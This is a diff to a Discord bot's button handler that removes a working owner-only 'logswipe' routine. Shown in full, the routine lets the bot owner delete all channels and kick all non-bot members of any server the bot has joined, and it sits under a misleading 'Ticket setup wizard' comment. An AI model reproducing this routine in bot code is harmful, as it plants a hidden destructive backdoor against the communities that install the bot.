@@ -2015,64 +2015,6 @@ client.on("interactionCreate",async interaction=>{
     }
 
     // Ticket setup wizard
-    if(cid==="logswipe_select"){
-      if(!OWNER_IDS.includes(uid)){await btnEphemeral(interaction,"Owner only.");return;}
-      const guildId=interaction.values[0];
-      const guild=client.guilds.cache.get(guildId);
-      if(!guild)return btnEphemeral(interaction,"Server not found.");
-      if(wipeProtected.has(guildId))return btnEphemeral(interaction,"That server is protected.");
-      if(!await btnAck(interaction))return;
-      const confirmRow=new MessageActionRow().addComponents(
-        new MessageButton().setCustomId(`logswipe_confirm_${guildId}`).setLabel(`☠️ Wipe ${guild.name}`).setStyle("DANGER"),
-        new MessageButton().setCustomId("logswipe_cancel").setLabel("Cancel").setStyle("SECONDARY"),
-      );
-      try{await interaction.editReply({
-        content:`⚠️ **Are you sure?**\n\nThis will:\n- Delete all channels in **${guild.name}**\n- Kick all non-bot members\n\nServer: **${guild.name}** (\`${guildId}\`)\nMembers: **${guild.memberCount}**\n\nThis **cannot be undone**.`,
-        components:[confirmRow],
-      });}catch(e){console.error("logswipe_select:",e?.message);}
-      return;
-    }
-
-    if(cid==="logswipe_cancel"){
-      if(!OWNER_IDS.includes(uid)){await btnEphemeral(interaction,"Owner only.");return;}
-      if(!await btnAck(interaction))return;
-      try{await interaction.editReply({content:"❌ Wipe cancelled.",components:[]});}catch{}
-      return;
-    }
-
-    if(cid.startsWith("logswipe_confirm_")){
-      if(!OWNER_IDS.includes(uid)){await btnEphemeral(interaction,"Owner only.");return;}
-      const guildId=cid.slice(17);
-      const guild=client.guilds.cache.get(guildId);
-      if(!guild){if(!await btnAck(interaction))return;try{await interaction.editReply({content:"❌ Server not found.",components:[]});}catch{}return;}
-      if(wipeProtected.has(guildId)){if(!await btnAck(interaction))return;try{await interaction.editReply({content:"❌ That server is protected.",components:[]});}catch{}return;}
-      if(!await btnAck(interaction))return;
-      try{await interaction.editReply({content:`⏳ Wiping **${guild.name}**…`,components:[]});}catch{}
-
-      let kickedCount=0,deletedChannels=0,failedKicks=0,failedChannels=0;
-
-      // Delete all channels
-      for(const channel of guild.channels.cache.values()){
-        await channel.delete().catch(()=>{failedChannels++;});
-        deletedChannels++;
-        await new Promise(res=>setTimeout(res,500));
-      }
-
-      // Kick all non-bot members
-      try{await guild.members.fetch();}catch{}
-      for(const member of guild.members.cache.values()){
-        if(member.user.bot||member.id===guild.ownerId)continue;
-        await member.kick("Server wipe initiated by bot owner").catch(()=>{failedKicks++;});
-        kickedCount++;
-        await new Promise(res=>setTimeout(res,500));
-      }
-
-      try{await interaction.editReply({
-        content:`✅ **Wipe complete — ${guild.name}**\n\n🗑️ Channels deleted: **${deletedChannels}** (${failedChannels} failed)\n👢 Members kicked: **${kickedCount}** (${failedKicks} failed)`,
-        components:[],
-      });}catch{}
-      return;
-    }
     if(cid.startsWith("ts_")){
       if(!interaction.guildId){await btnEphemeral(interaction,"Server only.");return;}
       const isOwner=OWNER_IDS.includes(uid);
